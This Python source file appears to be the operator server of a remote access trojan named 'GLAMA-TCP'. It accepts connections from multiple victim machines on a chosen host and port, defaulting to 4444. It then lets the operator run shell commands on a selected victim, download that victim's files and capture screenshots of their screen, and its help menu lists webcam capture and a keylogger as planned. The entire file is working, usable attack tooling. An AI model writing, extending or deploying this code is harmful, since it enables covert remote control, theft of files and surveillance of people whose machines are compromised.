import os
import socket
import threading
import time
import sys
from queue import Queue
import struct
import signal
import tqdm

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
BUFFER_SIZE = 512
SEPARATOR = "<SEPARATOR>"
receive_dir = 'Received/'

COMMANDS = {'\u001b[33m\u001b[1m\nhelp   ': ['Shows this help'],
            'list   ': ['Lists connected clients'],
            'exploit': ['Selects a client by its index. (ex : exploit 0, exploit 1...)'],
            'quit   ': ['Stops current connection with a client. Use it when client is selected'],
            'exit   ': ['Shut server down and close app\n\n'],

            'get    ': ['NEW!!! Downloading files from the client'],
            'capture': ['NEW!!! SCREENSHOT THE CLIENT SCREEN'],
            'webcam ': ['(Not Added) CAPTURE A PICTURE OF WEBCAM!'],
            'keylogger': ['(Not Added) CAPTURE A PICTURE OF WEBCAM!\u001b[0m\n\n'],
            }


class MultiServer(object):

    def __init__(self):
        print("\u001b[32m\u001b[1m")
        print("   _____ _               __  __            _______ _____ _____")
        print("  / ____| |        /\   |  \/  |   /\     |__   __/ ____|  __ \.")
        print(" | |  __| |       /  \  | \  / |  /  \       | | | |    | |__) |")
        print(" | | |_ | |      / /\ \ | |\/| | / /\ \      | | | |    |  ___/")
        print(" | |__| | |____ / ____ \| |  | |/ ____ \     | | | |____| |")
        print('  \_____|______/_/    \_\_|  |_/_/    \_\    |_|  \_____|_|     \u001b[0m\n')

        self.host = input("\u001b[33mSet the LHOST (empty for localhost): \u001b[0m")
        if self.host == '':
            self.host = 'localhost'

        self.port = input("\u001b[31mSet the LPORT (empty for 4444): \u001b[0m")
        try:
            self.port = int(self.port)
        except ValueError:
            self.port = 4444

        self.socket = None
        self.all_connections = []
        self.all_addresses = []

        print("\nThe ip to use for client is \u001b[31m%s\u001b[0m. The port is:\u001b[31m %s\u001b[0m" % (
            self.host, self.port))
        print("\u001b[36m\u001b[1mTo connect to the first client, type\u001b[0m\u001b[36m 'exploit 0' \u001b[0m\n")
        print("\n\u001b[31m\u001b[1mType 'help' to see the list of commands\u001b[0m")

    def print_help(self):
        for cmd, v in COMMANDS.items():
            print("{0}:\t{1}".format(cmd, v[0]))
        return

    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return

    def quit_gracefully(self):
        queue.task_done()
        queue.task_done()
        print('\u001b[31m\u001b[7m\u001b[1mServer shutdown and exit\u001b[0m')
        print('\nQuitting gracefully')
        for conn in self.all_connections:
            try:
                conn.shutdown(2)
                conn.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                continue
        self.socket.close()
        sys.exit(0)

    def socket_create(self):
        try:
            self.socket = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))
            # TODO: Added exit
            sys.exit(1)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return

    def socket_bind(self):
        """ Bind socket to port and wait for connection from client """
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except socket.error as e:
            print("Socket binding error: " + str(e))
            time.sleep(5)
            self.socket_bind()
        return

    def accept_connections(self):
        """ Accept connections from multiple clients and save to list """
        for c in self.all_connections:
            c.close()
        self.all_connections = []
        self.all_addresses = []
        while 1:
            try:
                conn, address = self.socket.accept()
                conn.setblocking(1)
                client_hostname = conn.recv(1024).decode("utf-8")
                address = address + (client_hostname,)
            except Exception as e:
                print('Error accepting connections: %s' % str(e))
                # Loop indefinitely
                continue
            self.all_connections.append(conn)
            self.all_addresses.append(address)
            print(
                '\n \u001b[35m\u001b[1mConnection has been established | NAME {0} | IP {1}\u001b[0m'.format(address[-1],
                                                                                                            address[0]))
        return

    def start_glama(self):
        """ Interactive prompt for sending commands remotely """
        while True:
            cmd = input('\u001b[36mglama-tcp>\u001b[0m ')
            if cmd == 'list':
                self.list_connections()
                continue
            elif 'exploit' in cmd:
                target, conn = self.get_target(cmd)
                if conn is not None:
                    self.send_target_commands(target, conn)
            elif cmd == 'exit':
                self.quit_gracefully()
            elif cmd == 'help':
                self.print_help()
            elif cmd == '':
                pass

            else:
                print('\u001b[31mError: Command not recognized\u001b[0m')
        return

    def list_connections(self):
        """ List all connections """
        results = ''
        for i, conn in enumerate(self.all_connections):
            try:
                conn.send(str.encode(' '))
                conn.recv(20480)
            except:
                del self.all_connections[i]
                del self.all_addresses[i]
                continue
            results += '\u001b[31m\u001b[1m' + str(i) + '\u001b[37m' + '   ' + '\u001b[33m' + str(
                self.all_addresses[i][0]) + '\u001b[37m' + '   ' + "\u001b[35m" + str(
                self.all_addresses[i][1]) + "\u001b[37m" + '   ' + "\u001b[36m" + str(
                self.all_addresses[i][2]) + '\u001b[0m\n'
        print(
            '\n\u001b[31mID\u001b[0m  \u001b[33mIP\u001b[0m             \u001b[35mPORT\u001b[0m      \u001b[36mCLIENT '
            'NAME\u001b[0m' + '\n\n' + results)
        return

    def get_target(self, cmd):
        """ Select target client
        :param cmd:
        """
        target = cmd.split(' ')[-1]
        try:
            target = int(target)
        except:
            print('\u001b[31mError : Client index should be an integer \u001b[0m')
            return None, None
        try:
            conn = self.all_connections[target]
        except IndexError:
            print('\u001b[31mError : Not a valid selection \u001b[0m')
            return None, None
        print("\u001b[31m\u001b[1m\u001b[7mYou are now connected to '" + str(
            self.all_addresses[target][2]) + "'\u001b[0m")
        return target, conn

    def read_command_output(self, conn):
        """ Read message length and unpack it into an integer
        :param conn:
        """
        raw_msg_len = self.recvall(conn, 4)
        if not raw_msg_len:
            return None
        msg_len = struct.unpack('>I', raw_msg_len)[0]
        # Read the message data
        return self.recvall(conn, msg_len)

    def recvall(self, conn, n):
        """ Helper function to receive n bytes or return None if EOF is hit
        :param n:
        :param conn:
        """
        # TODO: this can be a static method
        data = b''
        while len(data) < n:
            packet = conn.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    def download(self, conn):
        received = conn.recv(BUFFER_SIZE).decode("850")
        filename, filesize = received.split(SEPARATOR)
        filename = receive_dir + os.path.basename(filename)
        filesize = int(filesize)
        progress = tqdm.tqdm(range(filesize), f"Receiving {filename}", unit="B", unit_scale=True,
                             unit_divisor=1024)
        with open(filename, "wb") as f:
            for _ in progress:
                bytes_read = conn.recv(BUFFER_SIZE)

                if not bytes_read:
                    print("\u001b[33m\n\u001b[1mDONE!\nDisconnecting... just tap 'list' 2 times to see the client "
                          "machine\u001b[0m\n")
                    return

                f.write(bytes_read)
                progress.update(len(bytes_read))

    def get(self, conn, cmd):
        conn.send(str.encode(cmd))
        filename = input("Filename: ")
        conn.send(str.encode(filename))
        self.download(conn)

    def capture(self, conn, cmd):
        conn.send(str.encode(cmd))
        filename = input("Name of the screenshot: ")
        conn.send(str.encode('capture_' + filename + '.png'))
        self.download(conn)

    def send_target_commands(self, target, conn):
        """ Connect with remote target client
        :param conn:
        :param target:
        """
        conn.send(str.encode(" "))
        cwd_bytes = self.read_command_output(conn)
        cwd = str(cwd_bytes, "utf-8")
        print(cwd, end="")
        while True:
            try:
                cmd = input()
                if len(str.encode(cmd)) > 0 and cmd != 'get' and cmd != 'capture' and cmd != 'glama help':
                    conn.send(str.encode(cmd))
                    cmd_output = self.read_command_output(conn)
                    client_response = str(cmd_output, "utf-8")
                    print("\u001b[1m\u001b[33;1m" + client_response, end="" + "\u001b[0m")
                if cmd == 'quit':
                    break
                # DOWNLOADING FILES FROM CLIENT
                if cmd == 'get':
                    self.get(conn, cmd)
                if cmd == 'capture':
                    self.capture(conn, cmd)

            except Exception as e:
                print("Connection was lost %s" % str(e))
                break
        del self.all_connections[target]
        del self.all_addresses[target]
        return


def create_workers():
    """ Create worker threads (will die when main exits) """
    server = MultiServer()
    server.register_signal_handler()
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work, args=(server,))
        t.daemon = True
        t.start()
    return


def work(server):
    """ Do the next job in the queue (thread for handling connections, another for sending commands)
    :param server:
    """
    while True:
        x = queue.get()
        if x == 1:
            server.socket_create()
            server.socket_bind()
            server.accept_connections()
        if x == 2:
            server.start_glama()
        queue.task_done()


def create_jobs():
    """ Each list item is a new job """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()
    return


def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
